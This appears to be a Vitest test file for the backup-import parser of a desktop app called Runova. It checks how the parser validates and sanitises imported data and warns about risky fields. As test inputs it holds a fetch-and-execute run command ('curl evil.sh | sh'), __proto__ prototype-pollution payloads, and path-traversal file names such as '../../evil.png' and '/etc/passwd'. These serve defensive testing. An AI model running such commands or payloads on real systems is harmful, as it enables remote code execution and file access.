import { describe, expect, it } from 'vitest';
import { BACKUP_VERSION, type BackupEnvelope, parseBackup } from './envelope';

/**
 * An import reads a file the user picked, so every field here arrives from outside the app. What
 * comes out of `parseBackup` is written to the stores and, for two of the fields, later executed:
 * `cliArgs` joins the argv of a headless CLI run and a project's `runCommands` is what the Run
 * button starts. These tests pin down what is kept, what is dropped, and what is reported.
 */

/** A minimal file that parses, so each test only has to say what it changes. */
function envelope(data: Record<string, unknown>, version = BACKUP_VERSION): unknown {
  return { version, exportedAt: '2026-01-01T00:00:00.000Z', appVersion: '1.2.3', data };
}

function parsed(
  data: Record<string, unknown>,
): Extract<ReturnType<typeof parseBackup>, { ok: true }> {
  const result = parseBackup(envelope(data));
  if (!result.ok) throw new Error(`expected a parse, got: ${result.error}`);
  return result;
}

function errorOf(value: unknown): string {
  const result = parseBackup(value);
  return result.ok ? 'parsed' : result.error;
}

const project = {
  id: 'p1',
  name: 'Runova',
  folderPath: 'E:\\work\\runova',
  createdAt: '2025-01-01T00:00:00.000Z',
  updatedAt: '2025-06-01T00:00:00.000Z',
};

describe('the envelope itself', () => {
  it('reads a file this build wrote', () => {
    const result = parsed({
      projects: [project],
      templates: [{ id: 't1', name: 'Review', content: 'Look at this' }],
      activity: [{ id: 'a1', type: 'project-created', message: 'made a project' }],
    });
    expect(result.data.projects?.[0].name).toBe('Runova');
    expect(result.data.templates?.[0].name).toBe('Review');
    expect(result.data.activity?.[0].id).toBe('a1');
    expect(result.warnings).toEqual([]);
    expect(result.skipped).toEqual({});
  });

  it('reads an envelope with no collections at all', () => {
    const result = parsed({});
    expect(result.data.projects).toBeUndefined();
    expect(result.data.settings).toBeUndefined();
    expect(result.warnings).toEqual([]);
  });

  it.each([
    ['null', null],
    ['a string', 'not a backup'],
    ['a number', 42],
    ['an array', [{ version: BACKUP_VERSION }]],
    ['undefined', undefined],
  ])('refuses %s', (_label, value) => {
    expect(errorOf(value)).toBe('That file is not a valid Runova backup.');
  });

  it('refuses a newer format and says which one it saw', () => {
    // Downgrading matters: a file from a later release may hold fields this build would drop.
    expect(errorOf(envelope({}, BACKUP_VERSION + 1))).toContain(`version ${BACKUP_VERSION + 1}`);
  });

  it.each([
    ['a missing version', { exportedAt: 'x', data: {} }],
    ['a version as text', { version: String(BACKUP_VERSION), data: {} }],
    ['version zero', { version: 0, data: {} }],
  ])('refuses %s as an unsupported format', (_label, value) => {
    expect(errorOf(value)).toMatch(/unsupported format/);
  });

  it('refuses a file with no data object', () => {
    expect(errorOf({ version: BACKUP_VERSION })).toBe('That file is not a valid Runova backup.');
    expect(errorOf({ version: BACKUP_VERSION, data: [] })).toBe(
      'That file is not a valid Runova backup.',
    );
    expect(errorOf({ version: BACKUP_VERSION, data: 'projects' })).toBe(
      'That file is not a valid Runova backup.',
    );
  });

  it('ignores fields it does not know', () => {
    const result = parsed({ projects: [project], somethingNew: { nested: true } });
    expect(result.data.projects).toHaveLength(1);
    expect(Object.keys(result.data)).not.toContain('somethingNew');
  });

  it('accepts the encrypted sections without touching them, since they are read elsewhere', () => {
    // projectEnvironments needs the export password and vault is checked by vaultSection.ts.
    const result = parsed({
      projects: [project],
      projectEnvironments: { kdf: 'scrypt', salt: 'x' },
      vault: { version: 1 },
    });
    expect(result.ok).toBe(true);
    expect(result.data.projects).toHaveLength(1);
  });

  it('types the envelope the exporter builds', () => {
    // A compile-time check that the shape the writer uses is the shape the reader accepts.
    const written: BackupEnvelope = {
      version: BACKUP_VERSION,
      exportedAt: '2026-01-01T00:00:00.000Z',
      appVersion: '1.2.3',
      data: { projects: [] },
    };
    expect(parseBackup(written).ok).toBe(true);
  });
});

describe('prototype pollution', () => {
  it('does not let __proto__ in the file reach Object.prototype', () => {
    // JSON.parse keeps "__proto__" as a plain own key, and the builders spread entries, so this
    // has to stay inert. A polluted prototype would leak into every object in the app.
    const file = JSON.parse(
      `{"version":${BACKUP_VERSION},"data":{"__proto__":{"polluted":"yes"},
       "projects":[{"id":"p1","name":"n","folderPath":"/tmp/p",
       "__proto__":{"polluted":"yes"},"constructor":{"polluted":"yes"}}],
       "settings":{"__proto__":{"polluted":"yes"},"theme":"dark"},
       "blueprints":[{"id":"b1","projectId":"p1","__proto__":{"polluted":"yes"}}],
       "repositories":[{"id":"r1","__proto__":{"polluted":"yes"}}]}}`,
    ) as unknown;

    const result = parseBackup(file);
    expect(result.ok).toBe(true);
    const probe = {} as Record<string, unknown>;
    expect(probe.polluted).toBeUndefined();
    expect(Object.prototype).not.toHaveProperty('polluted');
    expect(([] as unknown as Record<string, unknown>).polluted).toBeUndefined();
  });

  it('keeps a project whose entry carried those keys, without inheriting them', () => {
    const file = JSON.parse(
      `{"version":${BACKUP_VERSION},"data":{"projects":[
        {"id":"p1","name":"n","folderPath":"/tmp/p","__proto__":{"polluted":"yes"}}]}}`,
    ) as unknown;
    const result = parseBackup(file);
    if (!result.ok) throw new Error(result.error);
    const restored = result.data.projects?.[0] as unknown as Record<string, unknown>;
    expect(restored.polluted).toBeUndefined();
    expect(Object.getPrototypeOf(restored)).toBe(Object.prototype);
  });

  it('does not let a constructor key replace the settings object', () => {
    const file = JSON.parse(
      `{"version":${BACKUP_VERSION},"data":{"settings":{"constructor":"broken","theme":"dark"}}}`,
    ) as unknown;
    const result = parseBackup(file);
    if (!result.ok) throw new Error(result.error);
    expect(result.data.settings?.theme).toBe('dark');
    expect(result.data.settings?.constructor).toBe(Object);
  });
});

describe('collections', () => {
  it('turns a collection that is not an array into an empty one', () => {
    const result = parsed({ projects: 'nope', templates: 7, activity: { id: 'a' } });
    expect(result.data.projects).toEqual([]);
    expect(result.data.templates).toEqual([]);
    expect(result.data.activity).toEqual([]);
    // Nothing was dropped, because there was never a row to drop.
    expect(result.skipped).toEqual({});
  });

  it('counts and reports the rows it could not read', () => {
    const result = parsed({
      projects: [project, { id: 'p2' }, null, 'a string', { name: 'no id', folderPath: '/x' }],
    });
    expect(result.data.projects).toHaveLength(1);
    expect(result.skipped).toEqual({ projects: 4 });
    expect(result.warnings).toContain('Skipped 4 unreadable projects.');
  });

  it('reports each collection separately', () => {
    const result = parsed({ projects: [{}], templates: [{}], scheduledTasks: [{}] });
    expect(result.skipped).toEqual({ projects: 1, templates: 1, 'scheduled tasks': 1 });
    expect(result.warnings).toHaveLength(3);
  });
});

describe('projects', () => {
  it('refuses a project with nothing to restore it by', () => {
    // folderPath in particular decides which directories the filesystem handlers will accept.
    const result = parsed({
      projects: [
        { id: 'a', name: 'n' },
        { id: 'b', name: 'n', folderPath: '   ' },
        { id: 'c', name: 'n', folderPath: 42 },
        { id: '', name: 'n', folderPath: '/x' },
        { id: 'd', name: '', folderPath: '/x' },
      ],
    });
    expect(result.data.projects).toEqual([]);
    expect(result.skipped.projects).toBe(5);
  });

  it('fills in every optional field rather than leaving it undefined', () => {
    const restored = parsed({ projects: [project] }).data.projects?.[0];
    expect(restored).toMatchObject({
      description: '',
      notes: '',
      prompt: '',
      tags: [],
      agentType: 'claude',
      websiteUrl: '',
      repoUrl: '',
      pinned: false,
      archived: false,
      cliId: null,
      iconDataUrl: null,
      runCommands: [],
    });
    expect(restored?.notifications).toBeTypeOf('object');
    expect(restored?.createdAt).toBe(project.createdAt);
  });

  it('drops the icon file name, since the image travels inside the backup', () => {
    const restored = parsed({
      projects: [{ ...project, iconFile: 'p1-icon.png', iconDataUrl: 'data:image/png;base64,AA' }],
    }).data.projects?.[0];
    expect(restored?.iconFile).toBeNull();
    expect(restored?.iconDataUrl).toBe('data:image/png;base64,AA');
  });

  it('keeps only string tags', () => {
    const restored = parsed({ projects: [{ ...project, tags: ['web', 42, null, 'api'] }] }).data
      .projects?.[0];
    expect(restored?.tags).toEqual(['web', 'api']);
  });

  it('reads the legacy single runCommand field', () => {
    const restored = parsed({ projects: [{ ...project, runCommand: '  pnpm dev  ' }] }).data
      .projects?.[0];
    expect(restored?.runCommands).toEqual([{ id: 'legacy', label: '', command: 'pnpm dev' }]);
  });

  it('normalizes the run command list rather than trusting it', () => {
    const restored = parsed({
      projects: [
        {
          ...project,
          runCommands: [
            { id: 'r1', label: ' Dev ', command: ' pnpm dev ' },
            { command: 'pnpm build' },
            { id: 'r3', command: '   ' },
            { id: 'r4', label: 'no command' },
          ],
        },
      ],
    }).data.projects?.[0];
    expect(restored?.runCommands).toEqual([
      { id: 'r1', label: 'Dev', command: 'pnpm dev' },
      { id: 'run-1', label: '', command: 'pnpm build' },
    ]);
  });

  it('warns when a backup carried run commands, because Run would start them', () => {
    const result = parsed({
      projects: [
        { ...project, runCommands: [{ id: 'r1', label: '', command: 'curl evil.sh | sh' }] },
      ],
    });
    expect(result.warnings).toContain(
      'This backup set project run commands. Check them on each project before using Run.',
    );
  });

  it('does not warn when no project has one', () => {
    expect(parsed({ projects: [project] }).warnings).toEqual([]);
  });
});

describe('settings', () => {
  it('keeps the keys this build knows and drops the rest', () => {
    const result = parsed({
      settings: { theme: 'dark', translateMaxRetries: 9, somethingRemoved: 'old value' },
    });
    expect(result.data.settings?.theme).toBe('dark');
    expect(result.data.settings?.translateMaxRetries).toBe(9);
    expect(result.data.settings).not.toHaveProperty('somethingRemoved');
  });

  it('fills the keys the backup left out from the defaults', () => {
    const settings = parsed({ settings: { theme: 'dark' } }).data.settings;
    expect(settings?.cliArgs).toEqual({});
    expect(settings?.pingTargets).toEqual(['1.1.1.1']);
  });

  it('keeps the Build Prompt sizing switch when the backup saved it off', () => {
    const settings = parsed({ settings: { promptBuilderAutoSize: false } }).data.settings;
    expect(settings?.promptBuilderAutoSize).toBe(false);
  });

  it('leaves Build Prompt sizing on for a backup made before the switch existed', () => {
    const settings = parsed({ settings: { theme: 'dark' } }).data.settings;
    expect(settings?.promptBuilderAutoSize).toBe(true);
  });

  it('ignores a settings value that is not an object', () => {
    expect(parsed({ settings: 'dark' }).data.settings).toBeUndefined();
    expect(parsed({ settings: [] }).data.settings).toBeUndefined();
  });

  it('cleans the CLI arguments and warns about the ones it kept', () => {
    // These end up in the argv of every headless run, so the user is told to look.
    const result = parsed({
      settings: { cliArgs: { 'claude-code': ' --model haiku ', 'codex-cli': '   ', junk: 42 } },
    });
    expect(result.data.settings?.cliArgs).toEqual({ 'claude-code': '--model haiku' });
    expect(result.warnings).toContain(
      'This backup set custom CLI arguments. Review them in Settings before running an agent.',
    );
  });

  it('does not warn when the arguments cleaned down to nothing', () => {
    const result = parsed({ settings: { cliArgs: { 'claude-code': '   ' } } });
    expect(result.data.settings?.cliArgs).toEqual({});
    expect(result.warnings).toEqual([]);
  });
});

describe('rows bound straight into SQL', () => {
  it('requires the ids every prompt history row is inserted with', () => {
    const result = parsed({
      promptHistory: [{ id: 'h1' }, { rawInput: 'no id' }],
    });
    expect(result.data.promptHistory).toEqual([
      {
        id: 'h1',
        rawInput: '',
        promptType: '',
        targetAI: '',
        content: '',
        source: 'builder',
        tags: [],
        projectId: null,
        createdAt: expect.any(String),
      },
    ]);
    expect(result.skipped['prompt history entries']).toBe(1);
  });

  it('requires an id and a blueprint id on a revision', () => {
    const result = parsed({
      blueprintRevisions: [
        { id: 'v1', blueprintId: 'b1', target: 'final-prompt', stepId: 'nonsense' },
        { id: 'v2' },
        { blueprintId: 'b1' },
      ],
    });
    expect(result.data.blueprintRevisions).toHaveLength(1);
    expect(result.data.blueprintRevisions?.[0]).toMatchObject({
      id: 'v1',
      target: 'final-prompt',
      // An unknown step id becomes null rather than reaching the table.
      stepId: null,
      text: '',
      attachmentNames: [],
    });
    expect(result.skipped['blueprint revisions']).toBe(2);
  });

  it('defaults an unknown revision target to a section', () => {
    const result = parsed({
      blueprintRevisions: [{ id: 'v1', blueprintId: 'b1', target: 'something-else' }],
    });
    expect(result.data.blueprintRevisions?.[0].target).toBe('section');
  });

  it('clamps a scheduled task status to one the app understands', () => {
    const result = parsed({
      scheduledTasks: [
        { id: 's1', projectId: 'p1', runAt: '2026-02-01T00:00:00.000Z', status: 'completed' },
        { id: 's2', projectId: 'p1', runAt: '2026-02-01T00:00:00.000Z', status: 'weird' },
        { id: 's3', projectId: 'p1' },
      ],
    });
    expect(result.data.scheduledTasks?.map((task) => task.status)).toEqual([
      'completed',
      'pending',
    ]);
    expect(result.skipped['scheduled tasks']).toBe(1);
  });

  it('keeps a scheduled task run settings and reads old tasks as manual', () => {
    const result = parsed({
      scheduledTasks: [
        {
          id: 's1',
          projectId: 'p1',
          runAt: '2026-02-01T00:00:00.000Z',
          status: 'missed',
          runMode: 'auto',
          cliId: 'claude-code',
          model: 'opus',
          effort: 'high',
          ranAt: '2026-02-01T00:00:05.000Z',
        },
        { id: 's2', projectId: 'p1', runAt: '2026-02-01T00:00:00.000Z', effort: 'huge' },
      ],
    });
    expect(result.data.scheduledTasks?.[0]).toMatchObject({
      status: 'missed',
      runMode: 'auto',
      cliId: 'claude-code',
      model: 'opus',
      effort: 'high',
      ranAt: '2026-02-01T00:00:05.000Z',
    });
    expect(result.data.scheduledTasks?.[1]).toMatchObject({ runMode: 'manual', effort: undefined });
  });

  it('keeps only string metadata on an activity event', () => {
    const result = parsed({
      activity: [
        { id: 'a1', type: 'project-created', metadata: { projectId: 'p1', count: 3 } },
        { id: 'a2', type: 'project-created', metadata: 'nope' },
      ],
    });
    expect(result.data.activity?.[0].metadata).toEqual({ projectId: 'p1' });
    expect(result.data.activity?.[1].metadata).toBeUndefined();
  });

  it('requires an id on a skill audit and both ids on a favorite', () => {
    const result = parsed({
      skillAudits: [{ id: 'au1', skillId: 'sk1', score: 'high' }, { id: 'au2' }],
      skillFavorites: [{ skillId: 'sk1' }, { name: 'no id' }],
    });
    expect(result.data.skillAudits?.[0]).toMatchObject({ id: 'au1', score: 0, findings: [] });
    expect(result.skipped['skill audits']).toBe(1);
    expect(result.data.skillFavorites?.[0]).toMatchObject({
      skillId: 'sk1',
      name: 'sk1',
      source: 'local',
      official: false,
    });
    expect(result.data.skillFavorites?.[0]).not.toHaveProperty('description');
    expect(result.skipped['favorite skills']).toBe(1);
  });

  it('keeps repositories with an id as they were written', () => {
    const result = parsed({
      repositories: [{ id: 'r1', name: 'Skills', url: 'https://example.com' }, { name: 'no id' }],
      mcpRepositories: [{ id: 'm1' }],
    });
    expect(result.data.repositories?.[0]).toMatchObject({ id: 'r1', name: 'Skills' });
    expect(result.data.mcpRepositories).toHaveLength(1);
    expect(result.skipped['skill repositories']).toBe(1);
  });

  it('requires a project id on a draft', () => {
    const result = parsed({
      projectDrafts: [
        { id: 'd1', projectId: 'p1', status: 'implemented' },
        { id: 'd2', projectId: 'p1', status: 'anything else' },
        { id: 'd3' },
      ],
    });
    expect(result.data.projectDrafts?.map((draft) => draft.status)).toEqual([
      'implemented',
      'draft',
    ]);
    expect(result.skipped['project drafts']).toBe(1);
  });

  it('reads notifications and defaults the unread flag to read', () => {
    const result = parsed({
      appNotifications: [{ id: 'n1', title: 'Build failed', read: 'yes' }, {}],
    });
    expect(result.data.appNotifications?.[0]).toMatchObject({
      id: 'n1',
      title: 'Build failed',
      kind: 'pipeline-failure',
      read: false,
    });
    expect(result.skipped.notifications).toBe(1);
  });

  it("keeps a server alert's page in the app, and only a text one", () => {
    const result = parsed({
      appNotifications: [
        { id: 'n1', kind: 'deploy-warning', route: '/deploy?server=srv-1' },
        { id: 'n2', kind: 'deploy-info', route: 42 },
      ],
    });
    expect(result.data.appNotifications?.[0]).toMatchObject({
      kind: 'deploy-warning',
      route: '/deploy?server=srv-1',
    });
    expect(result.data.appNotifications?.[1]).not.toHaveProperty('route');
  });
});

describe('blueprints and presets', () => {
  it('runs a blueprint through the app normalizer', () => {
    const result = parsed({
      blueprints: [{ id: 'b1', projectId: 'p1', sections: 'not a list', confirmBeforeWriting: 1 }],
    });
    const blueprint = result.data.blueprints?.[0];
    expect(blueprint?.id).toBe('b1');
    expect(Array.isArray(blueprint?.sections)).toBe(true);
    // Confirming before writing a folder full of files is the safe default.
    expect(blueprint?.confirmBeforeWriting).toBe(true);
    expect(blueprint?.docsFolder).toBeTypeOf('string');
  });

  it('drops a blueprint with no project to attach to', () => {
    const result = parsed({ blueprints: [{ id: 'b1' }, { projectId: 'p1' }] });
    expect(result.data.blueprints).toEqual([]);
    expect(result.skipped['project blueprints']).toBe(2);
  });

  it('drops a preset on an unknown step, which could never be shown', () => {
    const result = parsed({
      blueprintPresets: [
        { id: 'pr1', stepId: 'idea', label: 'Starter', text: 'Write the idea' },
        { id: 'pr2', stepId: 'not-a-step', label: 'Bad', text: 'x' },
        { id: 'pr3', stepId: 'idea', label: '', text: 'x' },
      ],
    });
    expect(result.data.blueprintPresets?.map((preset) => preset.id)).toEqual(['pr1']);
    expect(result.skipped['blueprint presets']).toBe(2);
  });
});

describe('blueprint attachments', () => {
  const blob = { fileName: 'a1b2.png', mime: 'image/png', size: 3, dataBase64: 'AAEC' };

  it('keeps a blob the app could have written', () => {
    const result = parsed({ blueprintAttachments: [blob] });
    expect(result.data.blueprintAttachments).toEqual([{ ...blob, omitted: undefined }]);
    expect(result.warnings).toEqual([]);
  });

  it.each([
    ['a traversal', '../../evil.png'],
    ['a dotted name', 'a..b.png'],
    ['a separator', 'sub/evil.png'],
    ['a backslash', 'sub\\evil.png'],
    ['a space', 'my file.png'],
    ['a non-ASCII name', 'sch\u00f6n.png'],
    ['an absolute path', '/etc/passwd'],
    ['a missing name', undefined],
    ['an empty name', ''],
  ])('drops %s, because the name becomes a path', (_label, fileName) => {
    const result = parsed({ blueprintAttachments: [{ ...blob, fileName }] });
    expect(result.data.blueprintAttachments).toEqual([]);
    expect(result.skipped['blueprint attachments']).toBe(1);
  });

  it('drops a blob whose base64 is not base64', () => {
    const result = parsed({ blueprintAttachments: [{ ...blob, dataBase64: 'AA!@#$%' }] });
    expect(result.data.blueprintAttachments).toEqual([]);
  });

  it('drops a blob far larger than any attachment the app writes', () => {
    // The bound is checked on the encoded length, so nothing huge is ever decoded.
    const result = parsed({
      blueprintAttachments: [{ ...blob, dataBase64: 'A'.repeat(15 * 1024 * 1024) }],
    });
    expect(result.data.blueprintAttachments).toEqual([]);
    expect(result.skipped['blueprint attachments']).toBe(1);
  });

  it('keeps the name of a blob whose bytes are missing, and says so', () => {
    const result = parsed({
      blueprintAttachments: [
        { fileName: 'big.png', mime: 'image/png', size: 99, omitted: 'too-large' },
        { fileName: 'gone.png', dataBase64: null },
      ],
    });
    expect(result.data.blueprintAttachments).toEqual([
      { fileName: 'big.png', mime: 'image/png', size: 99, dataBase64: null, omitted: 'too-large' },
      { fileName: 'gone.png', mime: '', size: 0, dataBase64: null, omitted: 'unreadable' },
    ]);
    expect(result.warnings).toContain(
      '2 blueprint attachment(s) were too large to include. Their names came back, the files did not.',
    );
  });

  it('ignores an omitted reason it does not recognize', () => {
    const result = parsed({ blueprintAttachments: [{ fileName: 'x.png', omitted: 'because' }] });
    expect(result.data.blueprintAttachments?.[0].omitted).toBe('unreadable');
  });
});
